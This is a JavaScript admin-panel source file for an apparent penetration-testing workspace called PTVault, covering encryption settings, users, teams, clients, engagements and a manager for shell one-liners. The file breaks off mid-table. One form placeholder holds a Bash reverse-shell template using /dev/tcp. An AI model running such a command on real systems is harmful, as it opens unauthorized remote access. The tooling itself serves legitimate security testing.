/**
 * PTVault Admin Panel Manager
 * Full-page section renderer with sidebar navigation
 */
const AdminPanel = {
    initialized: false,
    activeTab: 'settings',
    encryptionStatus: null,

    /**
     * Initialize admin panel as a full-page section
     */
    async init() {
        this.renderNav();
        await this.switchTab(this.activeTab);
        this.initialized = true;
    },

    /**
     * Render the sidebar navigation based on user role
     */
    renderNav() {
        const nav = document.getElementById('adminNav');
        if (!nav) return;

        const isAdmin = AppState.currentUser?.role === 'admin';

        let items = [
            { id: 'settings', icon: 'settings', label: 'Settings' }
        ];
        if (isAdmin) {
            items.push(
                { id: 'users', icon: 'users', label: 'Users' },
                { id: 'teams', icon: 'users', label: 'Teams' },
                { id: 'clients', icon: 'briefcase', label: 'Clients' },
                { id: 'shells', icon: 'terminal', label: 'Shell One-Liners' },
                { id: 'engagements', icon: 'folder-open', label: 'Engagements' }
            );
        }

        nav.innerHTML = items.map(item => `
            <button class="admin-nav-item ${item.id === this.activeTab ? 'active' : ''}"
                    data-admin-tab="${item.id}"
                    onclick="AdminPanel.switchTab('${item.id}')">
                <i data-lucide="${item.icon}" class="icon-sm"></i>
                <span>${item.label}</span>
            </button>
        `).join('');

        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    },

    /**
     * Switch between admin sub-tabs
     */
    async switchTab(tabId) {
        this.activeTab = tabId;

        // Update nav active states
        document.querySelectorAll('.admin-nav-item').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.adminTab === tabId);
        });

        const content = document.getElementById('adminContent');
        if (!content) return;

        switch (tabId) {
            case 'settings':
                content.innerHTML = this.renderSettingsTab();
                this.loadEncryptionStatus();
                this.loadIdleTimeout();
                break;
            case 'users':
                content.innerHTML = this.renderUsersTab();
                UserManager.loadUsers();
                break;
            case 'teams':
                content.innerHTML = this.renderTeamsTab();
                TeamManager.loadTeams();
                break;
            case 'clients':
                content.innerHTML = this.renderClientsTab();
                ClientManager.loadClients();
                break;
            case 'shells':
                content.innerHTML = this.renderShellsTab();
                this.loadOneliners();
                break;
            case 'engagements':
                content.innerHTML = this.renderEngagementsTab();
                this.loadEngagementsList();
                break;
        }

        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    },

    // ==================== Settings Tab ====================

    renderSettingsTab() {
        return `
            <div class="admin-tab-header">
                <h2>Settings</h2>
            </div>

            <!-- Database Encryption Section -->
            <div class="admin-section">
                <h4>Database Encryption</h4>
                <div id="encryptionStatusSection">
                    <div class="admin-item">
                        <div class="admin-item-info">
                            <span class="admin-item-name">SQLCipher Encryption</span>
                            <span class="admin-item-status" id="encryptionStatusBadge">Checking...</span>
                        </div>
                        <div class="admin-item-actions">
                            <button class="btn btn-sm" id="encryptionToggleBtn" style="display:none;" onclick="AdminPanel.toggleEncryption()">
                                Enable
                            </button>
                        </div>
                    </div>
                    <div id="encryptionDetails" class="encryption-details" style="display:none;">
                        <div class="encryption-detail-row">
                            <span class="encryption-detail-label">SQLCipher Library</span>
                            <span class="encryption-detail-value" id="encDetailAvailable">—</span>
                        </div>
                        <div class="encryption-detail-row">
                            <span class="encryption-detail-label">Key File</span>
                            <span class="encryption-detail-value" id="encDetailKeyFile">—</span>
                        </div>
                        <div class="encryption-detail-row">
                            <span class="encryption-detail-label">Salt File</span>
                            <span class="encryption-detail-value" id="encDetailSaltFile">—</span>
                        </div>
                        <div class="encryption-detail-row">
                            <span class="encryption-detail-label">Required by Policy</span>
                            <span class="encryption-detail-value" id="encDetailRequired">—</span>
                        </div>
                    </div>
                </div>

                <!-- Enable Encryption Form (hidden) -->
                <div id="encryptionEnableForm" class="admin-form" style="display:none;">
                    <p class="form-info">Enter your password to derive the encryption key. The database will be encrypted in-place with a backup created automatically.</p>
                    <div class="form-group">
                        <label for="encryptionPassword">Password *</label>
                        <input type="password" id="encryptionPassword" placeholder="Enter your admin password" required>
                    </div>
                    <div class="form-group">
                        <label for="encryptionKeyPath">Key File Location</label>
                        <input type="text" id="encryptionKeyPath" placeholder="Default: data/encryption.key">
                        <small class="form-help">Leave blank for default location. Use a custom path for external storage (e.g., USB drive).</small>
                    </div>
                    <div class="form-actions">
                        <button class="btn btn-secondary" onclick="AdminPanel.hideEncryptionForm()">Cancel</button>
                        <button class="btn btn-primary" onclick="AdminPanel.confirmEnableEncryption()">Encrypt Database</button>
                    </div>
                </div>

                <!-- Key Recovery Form (hidden) -->
                <div id="encryptionRecoverForm" class="admin-form" style="display:none;">
                    <p class="form-info">Key file is missing but the salt file exists. Enter your password to re-derive the encryption key.</p>
                    <div class="form-group">
                        <label for="recoverPassword">Password *</label>
                        <input type="password" id="recoverPassword" placeholder="Enter your admin password" required>
                    </div>
                    <div class="form-actions">
                        <button class="btn btn-secondary" onclick="AdminPanel.hideRecoverForm()">Cancel</button>
                        <button class="btn btn-primary" onclick="AdminPanel.confirmRecoverKey()">Recover Key</button>
                    </div>
                </div>
            </div>

            <!-- CyberChef Management (admin only) -->
            ${AppState.currentUser?.role === 'admin' ? `
            <div class="admin-section">
                <h4>CyberChef</h4>
                <div class="admin-item" id="cyberchefAdminItem">
                    <div class="admin-item-info">
                        <span class="admin-item-name">CyberChef</span>
                        <span class="admin-item-status" id="cyberchefVersionDisplay">Checking...</span>
                    </div>
                    <div class="admin-item-actions">
                        <button class="btn btn-sm btn-secondary" onclick="AdminPanel.checkCyberChefUpdate()" id="checkUpdateBtn">
                            Check for Updates
                        </button>
                        <button class="btn btn-sm btn-primary" id="updateCyberChefBtn" style="display:none;">
                            Update
                        </button>
                    </div>
                </div>
                <div id="cyberchefUpdateInfo" class="update-info" style="display:none;"></div>
            </div>
            ` : ''}

            <!-- Session Management -->
            ${AppState.currentUser?.role === 'admin' ? `
            <div class="admin-section">
                <h4>Session Management</h4>
                <div class="admin-item" style="flex-direction: column; align-items: stretch; gap: var(--spacing-sm);">
                    <div style="display: flex; align-items: center; justify-content: space-between;">
                        <div>
                            <span class="admin-item-name">Idle Timeout</span>
                            <p style="margin: 0.25rem 0 0; font-size: 0.8125rem; color: var(--text-muted);">
                                Automatically log out users after this many minutes of inactivity.
                            </p>
                        </div>
                    </div>
                    <div style="display: flex; align-items: center; gap: var(--spacing-sm); margin-top: var(--spacing-xs);">
                        <input type="number" id="idleTimeoutInput" class="form-input"
                               min="1" max="1440" value="15"
                               style="width: 100px; text-align: center;">
                        <span style="color: var(--text-muted); font-size: 0.875rem;">minutes (1–1440)</span>
                        <button class="btn btn-sm btn-primary" onclick="AdminPanel.saveIdleTimeout()" id="saveIdleTimeoutBtn">
                            Save
                        </button>
                    </div>
                </div>
            </div>
            ` : ''}
        `;
    },

    // ==================== Users Tab ====================

    renderUsersTab() {
        return `
            <div class="admin-tab-header">
                <h2>User Management</h2>
                <button class="btn btn-primary" onclick="UserManager.showUserForm()">
                    + Add User
                </button>
            </div>

            <!-- Inline Add/Edit Form (hidden by default) -->
            <div id="userFormCard" class="inline-form-card" style="display: none;">
                <h4 id="userFormTitle">Add User</h4>
                <input type="hidden" id="userId">
                <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                    <div class="form-group" style="flex:1;">
                        <label for="username">Username *</label>
                        <input type="text" id="username" class="form-input" required>
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label for="email">Email *</label>
                        <input type="email" id="email" class="form-input" required>
                    </div>
                </div>
                <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                    <div class="form-group" style="flex:1;">
                        <label for="userRole">Role *</label>
                        <select id="userRole" class="form-input" required>
                            <option value="admin">Admin (Full access)</option>
                            <option value="tester" selected>Tester (Create/edit/view)</option>
                            <option value="viewer">Viewer (Read-only)</option>
                        </select>
                    </div>
                    <div class="form-group" id="passwordGroup" style="flex:1;">
                        <label for="password">Password *</label>
                        <input type="password" id="password" class="form-input" autocomplete="new-password">
                        <small class="text-muted">At least 12 characters, with upper and lower case letters and a digit</small>
                    </div>
                </div>
                <div class="form-row" id="currentPasswordGroup" style="display:none;">
                    <div class="form-group" style="flex:1;">
                        <label for="currentPassword">Current password</label>
                        <input type="password" id="currentPassword" class="form-input" autocomplete="current-password">
                        <small class="text-muted">Needed to change your own password</small>
                    </div>
                </div>
                <div class="form-actions" style="display:flex;gap:var(--spacing-sm);justify-content:flex-end;margin-top:var(--spacing-md);">
                    <button class="btn btn-secondary" onclick="UserManager.hideUserForm()">Cancel</button>
                    <button class="btn btn-primary" onclick="UserManager.saveUser()">Save User</button>
                </div>
            </div>

            <!-- Users List -->
            <div id="usersList" class="admin-list">
                <p class="loading-text">Loading users...</p>
            </div>
        `;
    },

    // ==================== Teams Tab ====================

    renderTeamsTab() {
        return `
            <div class="admin-tab-header">
                <h2>Team Management</h2>
                <button class="btn btn-primary" onclick="TeamManager.showTeamForm()">
                    + Create Team
                </button>
            </div>

            <!-- Inline Team Form (hidden by default) -->
            <div id="teamFormCard" class="inline-form-card" style="display: none;">
                <h4 id="teamFormTitle">Create Team</h4>
                <input type="hidden" id="teamId">
                <div class="form-group">
                    <label for="teamName">Team Name *</label>
                    <input type="text" id="teamName" class="form-input">
                </div>
                <div class="form-group">
                    <label for="teamDescription">Description</label>
                    <textarea id="teamDescription" class="form-input" rows="3"></textarea>
                </div>
                <div class="form-actions" style="display:flex;gap:var(--spacing-sm);justify-content:flex-end;margin-top:var(--spacing-md);">
                    <button class="btn btn-secondary" onclick="TeamManager.hideTeamForm()">Cancel</button>
                    <button class="btn btn-primary" onclick="TeamManager.saveTeam()">Save Team</button>
                </div>
            </div>

            <!-- Teams List -->
            <div id="teamsList" class="admin-list">
                <p class="loading-text">Loading teams...</p>
            </div>

            <!-- Team Members Panel -->
            <div id="teamMembersPanel" style="display: none; margin-top: 1rem;">
                <div class="admin-section-header" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--spacing-md);">
                    <h4 id="teamMembersPanelTitle">Members</h4>
                    <button class="btn btn-sm btn-primary" onclick="TeamManager.showMemberForm()">
                        + Add Member
                    </button>
                </div>

                <!-- Inline Member Form (hidden by default) -->
                <div id="teamMemberFormCard" class="inline-form-card" style="display: none;">
                    <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                        <div class="form-group" style="flex:1;">
                            <label for="teamMemberUserId">User *</label>
                            <select id="teamMemberUserId" class="form-input">
                                <!-- Populated dynamically -->
                            </select>
                        </div>
                        <div class="form-group" style="flex:1;">
                            <label for="teamMemberRole">Role *</label>
                            <select id="teamMemberRole" class="form-input">
                                <option value="lead">Lead (Editor access)</option>
                                <option value="member" selected>Member (Viewer access)</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-actions" style="display:flex;gap:var(--spacing-sm);justify-content:flex-end;margin-top:var(--spacing-md);">
                        <button class="btn btn-secondary" onclick="TeamManager.hideMemberForm()">Cancel</button>
                        <button class="btn btn-primary" onclick="TeamManager.saveTeamMember()">Add Member</button>
                    </div>
                </div>

                <div id="teamMembersList" class="admin-list">
                    <p class="loading-text">Loading members...</p>
                </div>
            </div>
        `;
    },

    // ==================== Clients Tab ====================

    renderClientsTab() {
        return `
            <div class="admin-tab-header">
                <h2>Client Management</h2>
                <button class="btn btn-primary" onclick="ClientManager.showClientForm()">
                    + Add Client
                </button>
            </div>

            <!-- Inline Add/Edit Form (hidden by default) -->
            <div id="clientFormCard" class="inline-form-card" style="display: none;">
                <h4 id="clientFormTitle">Add Client</h4>
                <input type="hidden" id="clientId">

                <div class="form-group">
                    <label for="clientName">Name *</label>
                    <input type="text" id="clientName" class="form-input" required>
                </div>

                <h5 style="margin-top:var(--spacing-md);">Admin Contact</h5>
                <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                    <div class="form-group" style="flex:1;">
                        <label for="clientAdminName">Name</label>
                        <input type="text" id="clientAdminName" class="form-input">
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label for="clientAdminEmail">Email</label>
                        <input type="email" id="clientAdminEmail" class="form-input">
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label for="clientAdminPhone">Phone</label>
                        <input type="tel" id="clientAdminPhone" class="form-input">
                    </div>
                </div>

                <h5 style="margin-top:var(--spacing-md);">Technical Contact</h5>
                <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                    <div class="form-group" style="flex:1;">
                        <label for="clientTechName">Name</label>
                        <input type="text" id="clientTechName" class="form-input">
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label for="clientTechEmail">Email</label>
                        <input type="email" id="clientTechEmail" class="form-input">
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label for="clientTechPhone">Phone</label>
                        <input type="tel" id="clientTechPhone" class="form-input">
                    </div>
                </div>

                <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                    <div class="form-group" style="flex:2;">
                        <label for="clientAddress">Address</label>
                        <textarea id="clientAddress" class="form-input" rows="2"></textarea>
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label for="clientWebsite">Website</label>
                        <input type="url" id="clientWebsite" class="form-input" placeholder="https://example.com">
                    </div>
                </div>

                <div class="form-group">
                    <label for="clientNotes">Notes</label>
                    <textarea id="clientNotes" class="form-input" rows="3"></textarea>
                </div>

                <div class="form-actions" style="display:flex;gap:var(--spacing-sm);justify-content:flex-end;margin-top:var(--spacing-md);">
                    <button class="btn btn-secondary" onclick="ClientManager.hideClientForm()">Cancel</button>
                    <button class="btn btn-primary" onclick="ClientManager.saveClient()">Save Client</button>
                </div>
            </div>

            <!-- Clients List -->
            <div id="clientsList" class="admin-list">
                <p class="loading-text">Loading clients...</p>
            </div>
        `;
    },

    // ==================== Shell One-Liners Tab ====================

    shellOneliners: [],
    shellOnelinersLoaded: false,

    renderShellsTab() {
        return `
            <div class="admin-tab-header">
                <h2>Shell One-Liners</h2>
                <button class="btn btn-primary" onclick="AdminPanel.showAddOnelinerForm()">
                    + Add One-Liner
                </button>
            </div>

            <!-- Add/Edit Form (hidden by default) -->
            <div id="onelinerForm" class="inline-form-card" style="display: none;">
                <input type="hidden" id="onelinerEditId">
                <div class="form-row" style="display:flex;gap:var(--spacing-md);">
                    <div class="form-group" style="flex:1;">
                        <label>Category *</label>
                        <select id="onelinerCategory" required>
                            <option value="shells">Shells</option>
                            <option value="reverse_shells">Reverse Shells</option>
                            <option value="shell_upgrades">Shell Upgrades</option>
                        </select>
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label>Subcategory</label>
                        <input type="text" id="onelinerSubcategory" placeholder="e.g., bash, python, netcat">
                    </div>
                </div>
                <div class="form-group">
                    <label>Name *</label>
                    <input type="text" id="onelinerName" placeholder="e.g., Bash TCP Reverse Shell" required>
                </div>
                <div class="form-group">
                    <label>Command *</label>
                    <textarea id="onelinerCommand" rows="3" placeholder="e.g., bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1" required></textarea>
                    <small>Use {{LHOST}}, {{LPORT}}, {{RHOST}}, etc. for variables</small>
                </div>
                <div class="form-group">
                    <label>Description</label>
                    <input type="text" id="onelinerDescription" placeholder="Brief description of the command">
                </div>
                <div class="form-actions" style="display:flex;gap:var(--spacing-sm);justify-content:flex-end;margin-top:var(--spacing-md);">
                    <button class="btn btn-secondary" onclick="AdminPanel.hideOnelinerForm()">Cancel</button>
                    <button class="btn btn-primary" onclick="AdminPanel.saveOneliner()">Save</button>
                </div>
            </div>

            <!-- Filter and Search -->
            <div class="admin-filter-bar" style="display:flex;gap:var(--spacing-sm);margin-bottom:var(--spacing-md);">
                <select id="adminOnelinerCategoryFilter" onchange="AdminPanel.filterOneliners()" class="form-input" style="width:auto;">
                    <option value="all">All Categories</option>
                    <option value="shells">Shells</option>
                    <option value="reverse_shells">Reverse Shells</option>
                    <option value="shell_upgrades">Shell Upgrades</option>
                </select>
                <input type="text" id="adminOnelinerSearch" placeholder="Search..." oninput="AdminPanel.filterOneliners()" class="form-input" style="flex:1;">
            </div>

            <!-- One-liners List -->
            <div id="adminOnelinersList" class="admin-list">
                <p class="loading-text">Loading...</p>
            </div>
        `;
    },

    /**
     * Load shell one-liners from API
     */
    async loadOneliners() {
        try {
            this.shellOneliners = await API.shellOneliners.getAll();
            this.shellOnelinersLoaded = true;
            this.renderOnelinersList();
        } catch (error) {
            console.error('Failed to load shell one-liners:', error);
            showToast('Failed to load shell one-liners', 'error');
        }
    },

    /**
     * Filter and render one-liners list
     */
    filterOneliners() {
        this.renderOnelinersList();
    },

    /**
     * Render the one-liners list
     */
    renderOnelinersList() {
        const container = document.getElementById('adminOnelinersList');
        if (!container) return;

        const categoryFilter = document.getElementById('adminOnelinerCategoryFilter')?.value || 'all';
        const searchQuery = document.getElementById('adminOnelinerSearch')?.value?.toLowerCase() || '';

        const filtered = this.shellOneliners.filter(item => {
            const matchesCategory = categoryFilter === 'all' || item.category === categoryFilter;
            const matchesSearch = !searchQuery ||
                item.name.toLowerCase().includes(searchQuery) ||
                item.command.toLowerCase().includes(searchQuery) ||
                (item.subcategory && item.subcategory.toLowerCase().includes(searchQuery));
            return matchesCategory && matchesSearch;
        });

        if (filtered.length === 0) {
            container.innerHTML = '<p class="empty-text">No one-liners found</p>';
            return;
        }

        const grouped = {};
        filtered.forEach(item => {
            if (!grouped[item.category]) grouped[item.category] = [];
            grouped[item.category].push(item);
        });

        const categoryLabels = {
            'shells': 'Shells',
            'reverse_shells': 'Reverse Shells',
            'shell_upgrades': 'Shell Upgrades'
        };

        let html = '';
        Object.entries(grouped).forEach(([category, items]) => {
            html += `
                <div class="admin-list-group">
                    <h5 class="admin-list-group-title">${categoryLabels[category] || category}</h5>
                    ${items.map(item => `
                        <div class="admin-list-item">
                            <div class="admin-list-item-main">
                                <span class="admin-list-item-name">${escapeHtml(item.name)}</span>
                                <span class="admin-list-item-subcategory">${escapeHtml(item.subcategory || '')}</span>
                            </div>
                            <div class="admin-list-item-command">${escapeHtml(item.command.substring(0, 60))}${item.command.length > 60 ? '...' : ''}</div>
                            <div class="admin-list-item-actions">
                                ${item.is_builtin ? `
                                <span class="admin-list-item-builtin" title="Ships with PTVault and can't be changed">Built-in</span>
                                ` : `
                                <button class="btn btn-icon btn-sm" onclick="AdminPanel.editOneliner(${item.id})" title="Edit" aria-label="Edit ${escapeHtml(item.name)}">
                                    <i data-lucide="edit-2" class="icon-sm"></i>
                                </button>
                                <button class="btn btn-icon btn-sm btn-danger" onclick="AdminPanel.deleteOneliner(${item.id})" title="Delete" aria-label="Delete ${escapeHtml(item.name)}">
                                    <i data-lucide="trash-2" class="icon-sm"></i>
                                </button>
                                `}
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
        });

        container.innerHTML = html;

        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    },

    showAddOnelinerForm() {
        document.getElementById('onelinerEditId').value = '';
        document.getElementById('onelinerCategory').value = 'reverse_shells';
        document.getElementById('onelinerSubcategory').value = '';
        document.getElementById('onelinerName').value = '';
        document.getElementById('onelinerCommand').value = '';
        document.getElementById('onelinerDescription').value = '';
        document.getElementById('onelinerForm').style.display = 'block';
    },

    hideOnelinerForm() {
        document.getElementById('onelinerForm').style.display = 'none';
    },

    editOneliner(id) {
        const item = this.shellOneliners.find(o => o.id === id);
        if (!item || item.is_builtin) return;

        document.getElementById('onelinerEditId').value = id;
        document.getElementById('onelinerCategory').value = item.category;
        document.getElementById('onelinerSubcategory').value = item.subcategory || '';
        document.getElementById('onelinerName').value = item.name;
        document.getElementById('onelinerCommand').value = item.command;
        document.getElementById('onelinerDescription').value = item.description || '';
        document.getElementById('onelinerForm').style.display = 'block';
    },

    async saveOneliner() {
        const editId = document.getElementById('onelinerEditId').value;
        const category = document.getElementById('onelinerCategory').value;
        const subcategory = document.getElementById('onelinerSubcategory').value.trim();
        const name = document.getElementById('onelinerName').value.trim();
        const command = document.getElementById('onelinerCommand').value.trim();
        const description = document.getElementById('onelinerDescription').value.trim();

        if (!name || !command) {
            showToast('Name and command are required', 'error');
            return;
        }

        const variableMatches = command.match(/\{\{(\w+)\}\}/g) || [];
        const variables = [...new Set(variableMatches)].map(v => ({
            name: v.replace(/\{\{|\}\}/g, ''),
            default: ''
        }));

        const data = {
            category,
            subcategory: subcategory || null,
            name,
            command,
            description: description || null,
            variables
        };

        try {
            if (editId) {
                await API.shellOneliners.update(parseInt(editId), data);
                showToast('One-liner updated', 'success');
            } else {
                await API.shellOneliners.create(data);
                showToast('One-liner created', 'success');
            }

            this.hideOnelinerForm();
            this.shellOnelinersLoaded = false;
            await this.loadOneliners();

            // Refresh the tools page if it's showing shell one-liners
            if (typeof ShellOneLinersManager !== 'undefined') {
                ShellOneLinersManager.state.loading = true;
                await ShellOneLinersManager.loadData();
            }
        } catch (error) {
            console.error('Failed to save one-liner:', error);
            showToast('Failed to save: ' + error.message, 'error');
        }
    },

    async deleteOneliner(id) {
        if (!confirm('Are you sure you want to delete this one-liner?')) {
            return;
        }

        try {
            await API.shellOneliners.delete(id);
            showToast('One-liner deleted', 'success');

            this.shellOnelinersLoaded = false;
            await this.loadOneliners();

            // Refresh the tools page if it's showing shell one-liners
            if (typeof ShellOneLinersManager !== 'undefined') {
                ShellOneLinersManager.state.loading = true;
                await ShellOneLinersManager.loadData();
            }
        } catch (error) {
            console.error('Failed to delete one-liner:', error);
            showToast('Failed to delete: ' + error.message, 'error');
        }
    },

    // ==================== Encryption Management ====================

    async loadEncryptionStatus() {
        const badge = document.getElementById('encryptionStatusBadge');
        const toggleBtn = document.getElementById('encryptionToggleBtn');
        const details = document.getElementById('encryptionDetails');

        if (!badge) return;

        try {
            this.encryptionStatus = await API.admin.getEncryptionStatus();
            const s = this.encryptionStatus;

            if (s.enabled) {
                badge.textContent = 'Enabled';
                badge.className = 'admin-item-status status-installed';
                toggleBtn.textContent = 'Disable';
                toggleBtn.className = 'btn btn-sm btn-danger';
                toggleBtn.style.display = 'inline-block';
            } else if (s.available) {
                badge.textContent = 'Disabled';
                badge.className = 'admin-item-status status-not-installed';
                toggleBtn.textContent = 'Enable';
                toggleBtn.className = 'btn btn-sm btn-primary';
                toggleBtn.style.display = 'inline-block';
            } else {
                badge.textContent = 'Not Available';
                badge.className = 'admin-item-status status-not-installed';
                toggleBtn.style.display = 'none';
            }

            if (details) {
                details.style.display = 'block';

                const avail = document.getElementById('encDetailAvailable');
                avail.textContent = s.available ? 'Installed' : 'Not installed';
                avail.className = 'encryption-detail-value ' + (s.available ? 'status-ok' : 'status-warn');

                const keyFile = document.getElementById('encDetailKeyFile');
                keyFile.textContent = s.key_file_exists ? 'Present' : 'Missing';
                keyFile.className = 'encryption-detail-value ' + (s.key_file_exists ? 'status-ok' : (s.enabled ? 'status-error' : ''));

                const saltFile = document.getElementById('encDetailSaltFile');
                saltFile.textContent = s.salt_file_exists ? 'Present' : 'Missing';
                saltFile.className = 'encryption-detail-value ' + (s.salt_file_exists ? 'status-ok' : '');

                const required = document.getElementById('encDetailRequired');
                required.textContent = s.encryption_required ? 'Yes' : 'No';
                required.className = 'encryption-detail-value';
            }

            if (s.salt_file_exists && !s.key_file_exists && s.available) {
                const recoverForm = document.getElementById('encryptionRecoverForm');
                if (recoverForm) recoverForm.style.display = 'block';
            }

            // Load CyberChef status if settings tab is active and admin
            if (AppState.currentUser?.role === 'admin') {
                this.loadCyberChefStatus();
            }
        } catch (error) {
            console.error('Failed to load encryption status:', error);
            badge.textContent = 'Error';
            badge.className = 'admin-item-status status-not-installed';
        }
    },

    toggleEncryption() {
        if (!this.encryptionStatus) return;

        if (this.encryptionStatus.enabled) {
            if (!confirm('Are you sure you want to disable database encryption?\n\nThe database will be decrypted to plaintext. A backup of the encrypted database will be created.')) {
                return;
            }
            this.confirmDisableEncryption();
        } else {
            document.getElementById('encryptionEnableForm').style.display = 'block';
            document.getElementById('encryptionPassword').focus();
        }
    },

    hideEncryptionForm() {
        document.getElementById('encryptionEnableForm').style.display = 'none';
        document.getElementById('encryptionPassword').value = '';
        document.getElementById('encryptionKeyPath').value = '';
    },

    hideRecoverForm() {
        document.getElementById('encryptionRecoverForm').style.display = 'none';
        document.getElementById('recoverPassword').value = '';
    },

    async confirmEnableEncryption() {
        const password = document.getElementById('encryptionPassword').value;
        const keyPath = document.getElementById('encryptionKeyPath').value.trim();

        if (!password) {
            showToast('Password is required', 'error');
            return;
        }

        const btn = document.querySelector('#encryptionEnableForm .btn-primary');
        btn.disabled = true;
        btn.textContent = 'Encrypting...';

        try {
            const result = await API.admin.enableEncryption(password, keyPath || undefined);
            showToast(result.message || 'Database encrypted successfully', 'success');
            this.hideEncryptionForm();
            await this.loadEncryptionStatus();
        } catch (error) {
            showToast('Failed to enable encryption: ' + error.message, 'error');
        } finally {
            btn.disabled = false;
            btn.textContent = 'Encrypt Database';
        }
    },

    async confirmDisableEncryption() {
        const toggleBtn = document.getElementById('encryptionToggleBtn');
        toggleBtn.disabled = true;
        toggleBtn.textContent = 'Decrypting...';

        try {
            const result = await API.admin.disableEncryption();
            showToast(result.message || 'Database decrypted successfully', 'success');
            await this.loadEncryptionStatus();
        } catch (error) {
            showToast('Failed to disable encryption: ' + error.message, 'error');
        } finally {
            toggleBtn.disabled = false;
        }
    },

    async confirmRecoverKey() {
        const password = document.getElementById('recoverPassword').value;
        if (!password) {
            showToast('Password is required', 'error');
            return;
        }

        const btn = document.querySelector('#encryptionRecoverForm .btn-primary');
        btn.disabled = true;
        btn.textContent = 'Recovering...';

        try {
            const result = await API.admin.recoverEncryptionKey(password);
            showToast(result.message || 'Key recovered successfully', 'success');
            this.hideRecoverForm();
            await this.loadEncryptionStatus();
        } catch (error) {
            showToast('Failed to recover key: ' + error.message, 'error');
        } finally {
            btn.disabled = false;
            btn.textContent = 'Recover Key';
        }
    },

    // ==================== Idle Timeout Settings ====================

    async loadIdleTimeout() {
        const input = document.getElementById('idleTimeoutInput');
        if (!input) return;

        try {
            const data = await API.admin.getSettings();
            input.value = data.idle_timeout_minutes || 15;
        } catch (e) {
            // Leave default
        }
    },

    async saveIdleTimeout() {
        const input = document.getElementById('idleTimeoutInput');
        const btn = document.getElementById('saveIdleTimeoutBtn');
        if (!input || !btn) return;

        const val = parseInt(input.value, 10);
        if (isNaN(val) || val < 1 || val > 1440) {
            showToast('Value must be between 1 and 1440 minutes', 'error');
            return;
        }

        btn.disabled = true;
        btn.textContent = 'Saving...';

        try {
            await API.admin.updateSettings({ idle_timeout_minutes: val });
            showToast('Idle timeout updated', 'success');

            // Update the running IdleTimeoutManager if available
            if (window.idleTimeoutManager) {
                window.idleTimeoutManager.timeoutMinutes = val;
                window.idleTimeoutManager._resetTimers();
            }
        } catch (e) {
            showToast('Failed to save: ' + e.message, 'error');
        } finally {
            btn.disabled = false;
            btn.textContent = 'Save';
        }
    },

    // ==================== CyberChef Management ====================

    cyberchefStatus: null,

    async loadCyberChefStatus() {
        try {
            this.cyberchefStatus = await API.admin.getCyberChefStatus();
            this.updateCyberChefDisplay();
        } catch (error) {
            console.error('Failed to load CyberChef status:', error);
            this.cyberchefStatus = { installed: false };
        }
    },

    updateCyberChefDisplay() {
        const display = document.getElementById('cyberchefVersionDisplay');
        if (!display) return;

        if (this.cyberchefStatus?.installed) {
            display.textContent = `Installed: ${this.cyberchefStatus.version}`;
            display.className = 'admin-item-status status-installed';
        } else {
            display.textContent = 'Not Installed';
            display.className = 'admin-item-status status-not-installed';
        }
    },

    async checkCyberChefUpdate() {
        const btn = document.getElementById('checkUpdateBtn');
        const infoDiv = document.getElementById('cyberchefUpdateInfo');
        const updateBtn = document.getElementById('updateCyberChefBtn');

        btn.disabled = true;
        btn.textContent = 'Checking...';

        try {
            const result = await API.admin.checkCyberChefUpdate();

            if (result.update_available) {
                infoDiv.innerHTML = `
                    <p>New version available: <strong>${escapeHtml(result.latest_version)}</strong></p>
                    <p>Current version: ${result.current_version ? escapeHtml(result.current_version) : 'Not installed'}</p>
                `;
                infoDiv.style.display = 'block';
                updateBtn.style.display = 'inline-block';
                updateBtn.onclick = () => this.updateCyberChef();
            } else {
                infoDiv.innerHTML = '<p>You have the latest version.</p>';
                infoDiv.style.display = 'block';
                updateBtn.style.display = 'none';
            }
        } catch (error) {
            console.error('Failed to check for updates:', error);
            showToast('Failed to check for updates: ' + error.message, 'error');
        } finally {
            btn.disabled = false;
            btn.textContent = 'Check for Updates';
        }
    },

    // ==================== Engagements Tab (Admin-only delete) ====================

    renderEngagementsTab() {
        return `
            <div class="admin-tab-header">
                <h2>Engagements</h2>
                <p class="admin-tab-description">Permanently delete engagements and all their associated data. This action cannot be undone.</p>
            </div>
            <div class="admin-section">
                <div id="adminEngagementsList">
                    <p class="text-muted">Loading engagements…</p>
                </div>
            </div>
        `;
    },

    async loadEngagementsList() {
        const container = document.getElementById('adminEngagementsList');
        if (!container) return;

        try {
            const engagements = await API.engagements.getAll();
            // Cache so editEngagement() can hydrate AppState without a second fetch
            this._engagementsCache = engagements;
            if (!engagements || engagements.length === 0) {
                container.innerHTML = '<p class="text-muted">No engagements found.</p>';
                return;
            }

            container.innerHTML = `
                <table class="admin-table" style="width:100%;border-collapse:collapse;">
                    <thead>
                        <tr>
                            <th style="text-align:left;padding:10px 12px;border-bottom:1px solid var(--border-color);">Name</th>
                            <th style="text-align:left;padding:10px 12px;border-bottom:1px solid var(--border-color);">Client</th>
                            <th style="text-align:left;padding:10px 12px;border-bottom:1px solid var(--border-color);">Status</th>
                            <th style="text-align:left;padding:10px 12px;border-bottom:1px solid var(--border-color);">Dates</th>
                            <th style="text-align:right;padding:10px 12px;border-bottom:1px solid var(--border-color);">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${engagements.map(eng => `
                            <tr id="eng-row-${eng.id}" style="border-bottom:1px solid var(--border-color-light,#2a2a3a);">
                                <td style="padding:10px 12px;">${escapeHtml(eng.name)}</td>
                                <td style="padding:10px 12px;">${escapeHtml(eng.client || '—')}</td>
                                <td style="padding:10px 12px;">
